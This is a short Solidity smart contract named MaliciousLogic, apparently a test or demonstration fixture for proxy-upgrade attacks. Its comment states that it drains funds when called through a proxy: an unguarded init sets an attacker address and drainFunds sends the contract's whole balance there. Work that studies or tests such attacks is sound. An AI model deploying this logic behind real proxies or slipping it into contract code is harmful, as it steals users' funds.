// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

/// @title MaliciousLogic - Drains funds when called via proxy
contract MaliciousLogic {
    address public attacker;

    function init(address _attacker) external {
        attacker = _attacker;
    }

    function drainFunds() external {
        payable(attacker).transfer(address(this).balance);
    }
}
